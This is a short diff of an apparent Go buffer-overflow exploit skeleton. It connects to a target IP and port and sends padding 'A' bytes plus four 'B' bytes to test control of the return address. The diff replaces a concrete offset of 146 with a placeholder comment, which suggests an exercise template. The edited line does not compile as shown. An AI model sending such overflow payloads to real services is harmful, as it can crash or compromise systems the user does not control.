@@ -16,7 +16,7 @@ func main() {
 	ip := os.Args[1]
 	port := os.Args[2]
 	address := fmt.Sprintf("%s:%s", ip, port)
-	buffer := strings.Repeat("A", 146) + strings.Repeat("B", 4)
+	buffer := strings.Repeat("A", /*Based on the offset bytes, place your pattern here*/) + strings.Repeat("B", 4)
 	conn, err := net.Dial("tcp", address)
 		if err != nil {
 			fmt.Printf("Connection failed", err.Error())
